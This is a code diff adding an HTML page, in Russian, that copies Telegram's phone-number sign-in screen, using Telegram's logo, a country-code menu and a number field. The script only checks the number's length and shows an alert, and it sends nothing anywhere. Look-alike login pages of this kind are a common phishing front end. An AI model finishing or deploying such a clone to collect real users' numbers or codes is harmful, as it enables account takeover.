@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Регистрация</title>
+  <style>
+    body {
+      font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Apple Color Emoji", "Segoe UI", Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 75vh;
+      background-color: #212121;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      background-color: #212121;
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    h1 {
+      margin-top: 22px;
+      margin-bottom: 5px;
+      font-size: 1.20rem;
+      color: white;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 25px auto;
+      width: 120px; /* Уменьшили размер логотипа */
+      height: auto;
+    }
+
+    .note {
+      font-size: 0.88rem;
+      color: #aaa; /* Цвет текста, который вы хотите */
+      text-align: center;
+      margin-top: 10px;
+      margin-bottom: 39px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      position: relative;
+      text-align: left;
+    }
+
+    .input-group label {
+      position: absolute;
+      top: -10%;
+      left: 7px;
+      transform: translateY(-50%);
+      font-size: 0.74rem;
+      color: #aaa;
+      pointer-events: none;
+      background-color: #212121;
+      padding: 0 .23rem;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px 14px 14px 15px;
+      font-size: 1rem;
+      background-color: #212121;
+      color: #eee;
+      border: 2px solid #444;
+      border-radius: 11px;
+      box-sizing: border-box;
+    }
+
+    .phone-code-selector {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 14px 14px 15px;
+      font-size: 1rem;
+      background-color: #212121;
+      color: #eee;
+      border: 2px solid #444;
+      border-radius: 11px;
+      cursor: pointer;
+    }
+
+.flag-emoji {
+  font-size: 30px;  /* Размер эмодзи (флага) */
+  margin-right: 10px; /* Отступ справа от флага */
+  vertical-align: middle; /* Для выравнивания по центру с текстом */
+}
+
+.menu-item a {
+  text-decoration: none;  /* Убираем подчеркивание */
+  color: inherit;  /* Наследуем цвет текста от родительского элемента */
+}
+
+
+
+    .menu-container {
+      position: absolute;
+      background-color: #212121;
+      width: 100%;
+      top: 100%;
+      left: 0;
+      border-radius: 8px;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
+      display: none;
+      z-index: 10;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .menu-item {
+      padding: 10px;
+      color: white;
+      cursor: pointer;
+    }
+
+    .menu-item:hover {
+      background-color: #444;
+    }
+
+
+    .btn {
+      width: 100%;
+      padding: 10px;
+      font-size: 1rem;
+      border: none;
+      background-color: #0088cc;
+      color: white;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #0077b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="phone-step">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+      <h1>Telegram</h1>
+
+      <p class="note">Проверьте код страны и введите свой номер телефона.</p>
+
+      <form id="phone-form">
+        <div class="input-group">
+          <label for="country">Страна</label>
+          <!-- Селектор страны -->
+          <div class="phone-code-selector" onclick="toggleMenu()">
+            <span id="selected-country">Россия (+7)</span>
+            <span>&#9660;</span> <!-- Стрелка вниз -->
+          </div>
+          
+          <!-- Меню выбора страны -->
+          <div role="presentation" class="bubble menu-container custom-scroll opacity-transition fast left top shown open" id="country-menu">
+
+
+<div class="menu-item" data-code="+1">
+  <a href="https://example.com/usa">
+    <span class="flag-emoji">&#127462;&#127467;</span> США (+1)
+  </a>
+</div>
+<div class="menu-item" data-code="+1">
+  <a href="https://example.com/canada">
+    <span class="flag-emoji">&#127464;&#127462;</span> Канада (+1)
+  </a>
+</div>
+<div class="menu-item" data-code="+7">
+  <a href="https://example.com/russia">
+    <span class="flag-emoji">&#127479;&#127482;</span> Россия (+7)
+  </a>
+</div>
+<div class="menu-item" data-code="+374">
+  <a href="https://example.com/armenia">
+    <span class="flag-emoji">&#127466;&#127473;</span> Армения (+374)
+  </a>
+</div>
+<div class="menu-item" data-code="+994">
+  <a href="https://example.com/azerbaijan">
+    <span class="flag-emoji">&#127464;&#127475;</span> Азербайджан (+994)
+  </a>
+</div>
+<!-- Добавьте остальные элементы аналогично -->
+
+
+          </div>
+        </div>
+
+
+
+
+        <div class="input-group">
+          <label for="phone">Номер телефона</label>
+          <input type="tel" id="phone" name="phone">
+        </div>
+
+        <button type="button" class="btn" onclick="goToCodeStep()">Далее</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    let menuVisible = false;
+
+    function toggleMenu() {
+      const menu = document.getElementById('country-menu');
+      menu.style.display = menuVisible ? 'none' : 'block';
+      menuVisible = !menuVisible;
+    }
+
+    function selectCountry(event) {
+      const countryCode = event.target.dataset.code;
+      const selectedCountryText = event.target.textContent;
+      document.getElementById('selected-country').textContent = selectedCountryText;
+      document.getElementById('phone').value = countryCode + ' ';
+      toggleMenu(); // Закрыть меню после выбора
+    }
+
+    // Добавляем обработчики событий для каждого элемента меню
+    const menuItems = document.querySelectorAll('.menu-item');
+    menuItems.forEach(item => {
+      item.addEventListener('click', selectCountry);
+    });
+
+    // Устанавливаем код страны по умолчанию
+    window.onload = function() {
+      updatePhoneCode();
+    };
+
+    function updatePhoneCode() {
+      const countrySelect = document.getElementById('selected-country');
+      const countryCode = '+7'; // Значение для России
+      const phoneInput = document.getElementById('phone');
+      phoneInput.value = countryCode + ' '; // Обновляем поле телефона с кодом страны
+    }
+
+    function goToCodeStep() {
+      const phone = document.getElementById('phone').value;
+      if (!phone || phone.length < 10) {
+        alert('Введите корректный номер телефона!');
+        return;
+      }
+      alert('Дальше...');
+    }
+  </script>
+</body>
+</html>
